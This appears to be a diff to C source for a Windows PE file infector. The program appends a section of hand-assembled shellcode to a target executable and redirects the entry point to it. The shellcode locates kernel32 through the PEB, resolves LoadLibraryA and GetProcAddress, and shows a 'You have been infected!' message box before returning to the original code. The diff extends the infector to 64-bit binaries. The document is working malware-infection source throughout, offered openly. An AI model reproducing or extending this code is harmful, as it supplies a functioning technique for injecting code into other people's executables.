@@ -10,7 +10,7 @@ int main(int argc, char *argv[]) {
     // argv[1] = Path to executable
     FILE *fr = fopen(argv[1], "r+b");
     if (fr == NULL) {
-        printf("Error %d opening file.\n",errno);
+        printf("Error %d opening file.\n", errno);
         end(fr, 1);
     }
 
@@ -49,6 +49,7 @@ int main(int argc, char *argv[]) {
     // 0x10B => 32-bit
     // 0x20B => 64-bit
     imageOptionalHeader.Magic = getval(fr, dw, SEEK_SET, ioh_offset);
+    int size = imageOptionalHeader.Magic == 0x10B ? dd : dq;
 
     // TO-DO: Change entry point
     imageOptionalHeader.AddressOfEntryPoint =
@@ -58,9 +59,13 @@ int main(int argc, char *argv[]) {
     if (imageOptionalHeader.Magic == 0x10B)
         imageOptionalHeader.ImageBase =
                 getval(fr,dd, SEEK_SET, ioh_offset + 28);
-    else
+    else if (imageOptionalHeader.Magic == 0x20B)
         imageOptionalHeader.ImageBase =
-                getval(fr, 8, SEEK_SET, ioh_offset + 24);
+                getval(fr, dq, SEEK_SET, ioh_offset + 24);
+    else {
+        printf("Magic error.");
+        end(fr, 1);
+    }
     imageOptionalHeader.SectionAlignment =
             getval(fr, dd, SEEK_SET, ioh_offset + 32);
     imageOptionalHeader.FileAlignment =
@@ -81,15 +86,16 @@ int main(int argc, char *argv[]) {
     // Import Address Table (IAT)
     imageOptionalHeader.DataDirectory[12].VirtualAddress = getval(fr, dd, SEEK_SET,
                                                                   ioh_offset + (imageOptionalHeader.Magic == 0x10B
-                                                                          ? 192
-                                                                          : 208)); // iat_rva
+                                                                      ? 192
+                                                                      : 208)); // iat_rva
     imageOptionalHeader.DataDirectory[12].Size = getval(fr, dd, SEEK_SET,
                                                         ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 196 : 212));
 
     IMAGE_SECTION_HEADER lastish;
     lastish.PointerToRawData = 0;
-    DWORD lastish_offset = ioh_offset + imageFileHeader.SizeOfOptionalHeader + 40 * (imageFileHeader.NumberOfSections-1);
-    
+    DWORD lastish_offset = ioh_offset + imageFileHeader.SizeOfOptionalHeader +
+                           40 * (imageFileHeader.NumberOfSections - 1);
+
     // // File offset for Import Table and RVA of the containing section
     // DWORD import_offset, import_section_offset, import_section_rva = 0;
     // // File offset for IAT and RVA of the containing section
@@ -137,7 +143,7 @@ int main(int argc, char *argv[]) {
         // SizeOfRawData
         0, // Edited below
         // PointerToRawData
-        0, // Edited ~18 lines below (~ line 192)
+        0, // Edited below
         // PointerToRelocations
         0,
         // PointerToLinenumbers
@@ -175,122 +181,167 @@ int main(int argc, char *argv[]) {
     instruct(fr, 0xe8, 0, dd);
 
     // Save all registers
-    // push eax
+    // push r|eax
     write_instruction(fr, 0x50);
-    // push ecx
+    // push r|ecx
     write_instruction(fr, 0x51);
-    // push edx
+    // push r|edx
     write_instruction(fr, 0x52);
-    // push ebx
+    // push r|ebx
     write_instruction(fr, 0x53);
-    // push esi
+    // push r|esi
     write_instruction(fr, 0x56);
-    // push edi
+    // push r|edi
     write_instruction(fr, 0x57);
-    // push ebp
+    // push r|ebp
     write_instruction(fr, 0x55);
 
     int stack_reserved = 0;
     struct {
         // Each variable holds the address in the MEMORY
-        DWORD ImageBaseAddress;
-        DWORD OldEntryPoint;
-        DWORD Inject; // Beginning of the newly injected section
-        DWORD kernel32dll;
-        DWORD OrdinalTbl;
-        DWORD NamePtrTbl;
-        DWORD AddrTbl;
-        DWORD user32dll;
+        int ImageBaseAddress;
+        int OldEntryPoint;
+        int Inject; // Beginning of the newly injected section
+        int kernel32dll;
+        int OrdinalTbl;
+        int NamePtrTbl;
+        int AddrTbl;
+        int user32dll;
         // Order probably doesn't matter
         // but it's better for organisation if ordered according to appearance in the stack
-    } mem_stack; // Location of each variable IN THE STACK, relative to ebp
+    } mem_stack; // Location of each variable IN THE STACK, relative to r|ebp
 
     // Establish new stack frame
-    // mov ebp, esp
+    // mov r|ebp, r|esp
+    REX_IF64
     write_instruction(fr, 0x89e5);
-    // sub esp, stack_reserved
+    // sub r|esp, stack_reserved
+    REX_IF64
     instruct(fr, 0x83ec, stack_reserved, db); // Placeholder value
     const int stack_reserved_offset = ftell(fr);
 
-    // mov eax, [ebp + 0x1C] ; Retrieve EntryPoint + 1 + dd in mem
-    instruct(fr, 0x8b45, 0x1C, db);
-    // sub eax, imageOptionalHeader.AddressOfEntryPoint + 1 + dd ; get ImageBaseAddress in mem stored in eax
+    // mov r|eax, [ebp + 0x1C] OR [rbp + 0x38] ; Retrieve EntryPoint + 1 + dd in mem
+    REX_IF64
+    instruct(fr, 0x8b45, 7 * size, db);
+    // sub r|eax, imageOptionalHeader.AddressOfEntryPoint + 1 + dd ; get ImageBaseAddress in mem stored in r|eax
+    REX_IF64
     instruct(fr, 0x2d, imageOptionalHeader.AddressOfEntryPoint + 1 + dd, dd);
-    // mov [ebp + ImageBaseAddress], eax
-    instruct(fr, 0x8945, mem_stack.ImageBaseAddress = -(stack_reserved += dd), db);
+    // mov [r|ebp + ImageBaseAddress], r|eax
+    REX_IF64
+    instruct(fr, 0x8945, mem_stack.ImageBaseAddress = -(stack_reserved += size), db);
 
-    // add eax (ImageBaseAddress), old_entry
+    // add r|eax (ImageBaseAddress), old_entry
+    REX_IF64
     instruct(fr, 0x05, old_entry, dd);
-    // mov [ebp + OldEntryPoint], eax
-    instruct(fr, 0x8945, mem_stack.OldEntryPoint = -(stack_reserved += dd), db);
+    // mov [r|ebp + OldEntryPoint], r|eax
+    REX_IF64
+    instruct(fr, 0x8945, mem_stack.OldEntryPoint = -(stack_reserved += size), db);
 
-    // mov eax, [ebp + ImageBaseAddress]
+    // mov r|eax, [r|ebp + ImageBaseAddress]
+    REX_IF64
     instruct(fr, 0x8b45, mem_stack.ImageBaseAddress, db);
-    // add eax, newish.VirtualAddress
+    // add r|eax, newish.VirtualAddress
+    REX_IF64
     instruct(fr, 0x05, newish.VirtualAddress, dd);
-    // mov [ebp + Inject], eax
-    instruct(fr, 0x8945, mem_stack.Inject = -(stack_reserved += dd), db);
+    // mov [r|ebp + Inject], r|eax
+    REX_IF64
+    instruct(fr, 0x8945, mem_stack.Inject = -(stack_reserved += size), db);
 
-    // Find kernel32.dll
-    // mov ebx, fs:0x30
-    instruct(fr, 0x648B1D, 0x30,dd); // 0x64 is a FS segment override prefix, not actually an instruction
-    // mov ebx, [ebx + 0x0C]
-    instruct(fr, 0x8b5b, 0xc, db);
-    // mov ebx, [ebx + 0x14]
-    instruct(fr, 0x8b5b, 0x14, db);
-    // mov ebx, [ebx]
+    // Find kernel32.dll (https://idafchev.github.io/blog/writing_windows_shellcode/#find-the-dll-base-address)
+    if (imageOptionalHeader.Magic == 0x10B) {
+        // mov ebx, fs:0x30 ; Retrieve PEB address
+        write_instruction(fr, 0x64); // FS segment override prefix
+        instruct(fr, 0x8B1D, 0x30,dd);
+    } else {
+        // mov rbx, gs:0x60
+        write_instruction(fr, 0x65); // GS segment override prefix
+        REX_IF64
+        instruct(fr, 0x8B1C25, 0x60, dd);
+    }
+    // mov r|ebx, [ebx + 0x0C] OR [rbx + 0x18] ; Get LdrData in PEB
+    REX_IF64
+    instruct(fr, 0x8b5b, imageOptionalHeader.Magic == 0x10B ? 0xc : 0x18, db);
+    // mov r|ebx, [ebx + 0x14] OR [rbx + 0x20] ; 
+    REX_IF64
+    instruct(fr, 0x8b5b, imageOptionalHeader.Magic == 0x10B ? 0x14 : 0x20, db);
+    // mov r|ebx, [r|ebx]
+    REX_IF64
     write_instruction(fr, 0x8b1b);
-    // mov ebx, [ebx]
+    // mov r|ebx, [r|ebx]
+    REX_IF64
     write_instruction(fr, 0x8b1b);
-    // mov ebx, [ebx + 0x10]
-    instruct(fr, 0x8b5b, 0x10, db);
-    // mov [ebp + kernel32dll], ebx
-    instruct(fr, 0x895d, mem_stack.kernel32dll = -(stack_reserved += dd), db);
+    // mov r|ebx, [ebx + 0x10] OR [rbx + 0x20] ; Get BaseAddress of kernel32.dll
+    REX_IF64
+    instruct(fr, 0x8b5b, imageOptionalHeader.Magic == 0x10B ? 0x10 : 0x20, db);
+    // mov [r|ebp + kernel32dll], r|ebx
+    REX_IF64
+    instruct(fr, 0x895d, mem_stack.kernel32dll = -(stack_reserved += size), db);
 
-    // mov eax, [ebx + 3Ch]
+    // mov r|eax, [r|ebx + 3Ch]
+    REX_IF64
     instruct(fr, 0x8b43, 0x3c, db); // RVA of PE signature
-    // add eax, ebx
+    // add r|eax, r|ebx
+    REX_IF64
     write_instruction(fr, 0x01d8);
-    // mov eax, [eax + 78h]
-    instruct(fr, 0x8b40, 0x78,db); // RVA of Export Table
-    // add eax, ebx
+    // mov r|eax, [eax + 78h]
+    REX_IF64
+    instruct(fr, 0x8b80, 24 + 96, dd); // RVA of Export Table
+    // add r|eax, r|ebx
+    REX_IF64
     write_instruction(fr, 0x01d8);
-    // mov ecx, [eax + 24h]
-    instruct(fr, 0x8b48, 0x24,db); // RVA of Ordinal Table
-    // add ecx, ebx
+    // mov r|ecx, [r|eax + 24h]
+    REX_IF64
+    instruct(fr, 0x8b48, 36,db); // RVA of Ordinal Table
+    // add r|ecx, r|ebx
+    REX_IF64
     write_instruction(fr, 0x01d9);
-    // mov [ebp + OrdinalTbl], ecx
-    instruct(fr, 0x894d, mem_stack.OrdinalTbl = -(stack_reserved += dd),db);
-    // mov edi, [eax + 20h]
-    instruct(fr, 0x8b78, 0x20,db); // RVA of Name Pointer Table
-    // add edi, ebx
+    // mov [r|ebp + OrdinalTbl], r|ecx
+    REX_IF64
+    instruct(fr, 0x894d, mem_stack.OrdinalTbl = -(stack_reserved += size),db);
+    // mov r|edi, [r|eax + 20h]
+    REX_IF64
+    instruct(fr, 0x8b78, 32,db); // RVA of Name Pointer Table
+    // add r|edi, r|ebx
+    REX_IF64
     write_instruction(fr, 0x01df);
-    // mov [ebp + NamePtrTbl], edi
-    instruct(fr, 0x897d, mem_stack.NamePtrTbl = -(stack_reserved += dd),db);
-    // mov edx, [eax + 1Ch]
-    instruct(fr, 0x8b50, 0x1c,db); // RVA of Address Table
-    // add edx, ebx
+    // mov [r|ebp + NamePtrTbl], r|edi
+    REX_IF64
+    instruct(fr, 0x897d, mem_stack.NamePtrTbl = -(stack_reserved += size),db);
+    // mov r|edx, [r|eax + 1Ch]
+    REX_IF64
+    instruct(fr, 0x8b50, 28,db); // RVA of Address Table
+    // add r|edx, r|ebx
+    REX_IF64
     write_instruction(fr, 0x01da);
-    // mov [ebp + AddrTbl], edx
-    instruct(fr, 0x8955, mem_stack.AddrTbl = -(stack_reserved += dd), db);
-    // mov edx, [eax + 14h]
-    instruct(fr, 0x8b50, 0x14,db); // Number of exported functions
-    // xor eax, eax
+    // mov [r|ebp + AddrTbl], r|edx
+    REX_IF64
+    instruct(fr, 0x8955, mem_stack.AddrTbl = -(stack_reserved += size), db);
+    // mov r|edx, [r|eax + 14h]
+    REX_IF64
+    instruct(fr, 0x8b50, 0x20,db); // Number of exported functions
+    // xor r|eax, r|eax
+    REX_IF64
     write_instruction(fr, 0x31c0);
 
     // Find "LoadLibraryA"
     const int lla_loopback = ftell(fr);
-    // mov edi, [ebp + NamePtrTbl]
+    // mov r|edi, [r|ebp + NamePtrTbl]
+    REX_IF64
     instruct(fr, 0x8b7d, mem_stack.NamePtrTbl, db);
-    // mov edi, [edi + eax*4]
+    // mov r|edi, [r|edi + r|eax*4]
+    REX_IF64
     write_instruction(fr, 0x8b3c87);
-    // add edi, ebx
+    // add r|edi, r|ebx
+    REX_IF64
     write_instruction(fr, 0x01df);
-    // mov esi, [ebp + Inject]
+    // mov r|esi, [r|ebp + Inject]
+    REX_IF64
     instruct(fr, 0x8b75, mem_stack.Inject, db);
-    // add esi, &data[2]
+    // add r|esi, &data[2]
+    REX_IF64
     instruct(fr, 0x83c6, data[2] - data[0], db);
-    // xor ecx, ecx
+    // xor r|ecx, r|ecx
+    REX_IF64
     write_instruction(fr, 0x31c9);
     // cld
     write_instruction(fr, 0xfc);
@@ -302,62 +353,80 @@ int main(int argc, char *argv[]) {
     instruct(fr, 0x0f84, 0,dd); // Placeholder value to be edited later
     const int lla_jz_found = ftell(fr);
 
-    // inc eax
+    // inc r|eax
+    REX_IF64
     write_instruction(fr, 0x40);
-    // cmp eax,edx
+    // cmp r|eax,r|edx
+    REX_IF64
     write_instruction(fr, 0x39d0);
     // jb loopback
     instruct(fr, 0x0f82, lla_loopback - (ftell(fr) + 2 + dd), dd);
-        // From lla_loopback to the end of the current instruction
+    // From lla_loopback to the end of the current instruction
 
     // jmp entry
     write_instruction(fr, 0xe9); // Not found, go to entry point, filled later
     pad(fr, 4);
     const int lla_jmp_entry = ftell(fr); // Save address to be edited later
 
-    // Found "LoadLibraryA", eax hold address
+    // Found "LoadLibraryA", r|eax hold address
     setval_int(fr, ftell(fr) - lla_jz_found, dd, SEEK_SET, lla_jz_found - dd);
     fseek(fr, 0, SEEK_END);
-    // mov ecx, [ebp + OrdinalTbl]
+    // mov r|ecx, [r|ebp + OrdinalTbl]
+    REX_IF64
     instruct(fr, 0x8b4d, mem_stack.OrdinalTbl, db);
-    // mov edx, [ebp + AddrTbl]
+    // mov r|edx, [r|ebp + AddrTbl]
+    REX_IF64
     instruct(fr, 0x8b55, mem_stack.AddrTbl, db);
-    // mov ax, [ecx + eax*2]
+    // mov ax, [r|ecx + r|eax*2]
     write_instruction(fr, 0x668b0441);
-    // mov eax, [edx + eax*4]
+    // mov r|eax, [r|edx + r|eax*4]
+    REX_IF64
     write_instruction(fr, 0x8b0482);
-    // add eax, ebx
-    write_instruction(fr, 0x01d8); // eax holds mem addr of LoadLibraryA
-    // mov esi, [ebp + Inject]
+    // add r|eax, r|ebx
+    REX_IF64
+    write_instruction(fr, 0x01d8); // r|eax holds mem addr of LoadLibraryA
+    // mov r|esi, [r|ebp + Inject]
+    REX_IF64
     instruct(fr, 0x8b75, mem_stack.Inject, db);
-    // add esi, &data[4]
+    // add r|esi, &data[4]
+    REX_IF64
     instruct(fr, 0x83c6, data[4] - data[0], db);
-    // push esi ("user32.dll")
+    // push r|esi ("user32.dll")
     write_instruction(fr, 0x56);
-    // call eax
+    // call r|eax
     write_instruction(fr, 0xffd0);
-    // mov [ebp + user32dll], eax
-    instruct(fr, 0x8945, mem_stack.user32dll = -(stack_reserved += dd), db);
-    // mov ecx, [ebp + OrdinalTbl]
+    // mov [r|ebp + user32dll], r|eax
+    REX_IF64
+    instruct(fr, 0x8945, mem_stack.user32dll = -(stack_reserved += size), db);
+    // mov r|ecx, [r|ebp + OrdinalTbl]
+    REX_IF64
     instruct(fr, 0x8b4d, mem_stack.OrdinalTbl, db);
-    // mov edx, [ebp + AddrTbl]
+    // mov r|edx, [r|ebp + AddrTbl]
+    REX_IF64
     instruct(fr, 0x8b55, mem_stack.AddrTbl, db);
-    // xor eax, eax
+    // xor r|eax, r|eax
+    REX_IF64
     write_instruction(fr, 0x31c0);
 
     // Find "GetProcAddress"
     const int gpa_loopback = ftell(fr);
-    // mov edi, [ebp + NamePtrTbl]
+    // mov r|edi, [r|ebp + NamePtrTbl]
+    REX_IF64
     instruct(fr, 0x8b7d, mem_stack.NamePtrTbl, db);
-    // mov edi, [edi + eax*4]
+    // mov r|edi, [r|edi + r|eax*4]
+    REX_IF64
     write_instruction(fr, 0x8b3c87);
-    // add edi, ebx;
+    // add r|edi, r|ebx
+    REX_IF64
     write_instruction(fr, 0x01df);
-    // mov esi, [ebp + Inject]
+    // mov r|esi, [r|ebp + Inject]
+    REX_IF64
     instruct(fr, 0x8b75, mem_stack.Inject, db);
-    // add esi, &data[3]
+    // add r|esi, &data[3]
+    REX_IF64
     instruct(fr, 0x83c6, data[3] - data[0], db);
-    // xor ecx, ecx
+    // xor r|ecx, r|ecx
+    REX_IF64
     write_instruction(fr, 0x31c9);
     // cld
     write_instruction(fr, 0xfc);
@@ -369,57 +438,68 @@ int main(int argc, char *argv[]) {
     instruct(fr, 0x0f84, 0,dd); // Placeholder value to be edited later
     const int gpa_jz_found = ftell(fr);
 
-    // inc eax
+    // inc r|eax
+    REX_IF64
     write_instruction(fr, 0x40);
-    // cmp eax,edx
+    // cmp r|eax,r|edx
+    REX_IF64
     write_instruction(fr, 0x39d0);
     // jb loopback
     instruct(fr, 0x0f82, gpa_loopback - (ftell(fr) + 2 + dd), dd);
-        // From lla_loopback to the end of the current instruction
+    // From lla_loopback to the end of the current instruction
 
     // jmp entry
     write_instruction(fr, 0xe9); // Not found, go to entry point, filled later
     pad(fr, 4);
     const int gpa_jmp_entry = ftell(fr); // Save address to be edited later
 
-    // Found "GetProcAddress", eax hold address
+    // Found "GetProcAddress", r|eax hold address
     setval_int(fr, ftell(fr) - gpa_jz_found, dd, SEEK_SET, gpa_jz_found - dd);
     fseek(fr, 0, SEEK_END);
-    // mov ecx, [ebp + OrdinalTbl]
+    // mov r|ecx, [r|ebp + OrdinalTbl]
+    REX_IF64
     instruct(fr, 0x8b4d, mem_stack.OrdinalTbl, db);
-    // mov edx, [ebp + AddrTbl]
+    // mov r|edx, [r|ebp + AddrTbl]
+    REX_IF64
     instruct(fr, 0x8b55, mem_stack.AddrTbl, db);
-    // mov ax, [ecx + eax*2]
+    // mov ax, [r|ecx + r|eax*2]
     write_instruction(fr, 0x668b0441);
-    // mov eax, [edx + eax*4]
+    // mov r|eax, [r|edx + r|eax*4]
+    REX_IF64
     write_instruction(fr, 0x8b0482);
-    // add eax, ebx
-    write_instruction(fr, 0x01d8); // eax holds mem addr of GetProcAddress
-    // mov esi, [ebp + Inject]
+    // add r|eax, r|ebx
+    REX_IF64
+    write_instruction(fr, 0x01d8); // r|eax holds mem addr of GetProcAddress
+    // mov r|esi, [r|ebp + Inject]
+    REX_IF64
     instruct(fr, 0x8b75, mem_stack.Inject, db);
-    // add esi, &data[5]
+    // add r|esi, &data[5]
+    REX_IF64
     instruct(fr, 0x83c6, data[5] - data[0], db);
-    // push esi ("MessageBoxA")
+    // push r|esi ("MessageBoxA")
     write_instruction(fr, 0x56);
-    // push [ebp + user32dll]
+    // push [r|ebp + user32dll]
+    REX_IF64
     instruct(fr, 0xff75, mem_stack.user32dll, db);
-    // call eax (GetProcAddress)
-    write_instruction(fr, 0xffd0); // eax holds mem addr of MessageBoxA
+    // call r|eax (GetProcAddress)
+    write_instruction(fr, 0xffd0); // r|eax holds mem addr of MessageBoxA
 
     // Invoke MessageBoxA
     // push 2030h (Type)
     instruct(fr, 0x68, MB_OK | MB_ICONWARNING | MB_TASKMODAL, dd);
-    // mov edx, [ebp + Inject] ; Also address of data[0]
+    // mov r|edx, [r|ebp + Inject] ; Also address of data[0]
+    REX_IF64
     instruct(fr, 0x8b55, mem_stack.Inject, db);
-    // push edx ("Notice")
+    // push r|edx ("Notice")
     write_instruction(fr, 0x52);
-    // add edx, &data[1]
+    // add r|edx, &data[1]
+    REX_IF64
     instruct(fr, 0x83c2, data[1] - data[0], db);
-    // push edx ("You have been infected!")
+    // push r|edx ("You have been infected!")
     write_instruction(fr, 0x52);
     // push 0 (hWnd)
     instruct(fr, 0x6a, 0, db);
-    // call eax (MessageBoxA)
+    // call r|eax (MessageBoxA)
     write_instruction(fr, 0xFFD0);
 
     const int to_entry = ftell(fr);
@@ -432,26 +512,27 @@ int main(int argc, char *argv[]) {
 
     fseek(fr, 0, SEEK_END);
     // Reinstate stack
-    // add esp, stack_reserved
+    // add r|esp, stack_reserved
+    REX_IF64
     instruct(fr, 0x83c4, stack_reserved, db);
-    // pop ebp
+    // pop r|ebp
     write_instruction(fr, 0x5d);
-    // pop edi
+    // pop r|edi
     write_instruction(fr, 0x5f);
-    // pop esi
+    // pop r|esi
     write_instruction(fr, 0x5e);
-    // pop ebx
+    // pop r|ebx
     write_instruction(fr, 0x5b);
-    // pop edx
+    // pop r|edx
     write_instruction(fr, 0x5a);
-    // pop ecx
+    // pop r|ecx
     write_instruction(fr, 0x59);
-    // pop eax
+    // pop r|eax
     write_instruction(fr, 0x58);
 
-    // jmp [esp - 7 * 0x04 + OldEntryPoint]
+    // jmp [r|esp - 7 * size + OldEntryPoint]
     // Obtain address of OldEntryPoint in mem stored in the stack before the pops
-    instruct(fr, 0xff6424, -7 * 4 + mem_stack.OldEntryPoint, db);
+    instruct(fr, 0xff6424, -7 * size + mem_stack.OldEntryPoint, db);
 
     newish.Misc.VirtualSize = ftell(fr) - newish.PointerToRawData;
     newish.SizeOfRawData = closest(newish.Misc.VirtualSize, imageOptionalHeader.FileAlignment);
